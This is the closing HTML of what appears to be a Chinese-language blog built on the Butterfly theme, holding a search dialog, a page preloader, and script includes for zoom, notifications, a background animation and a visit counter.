class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>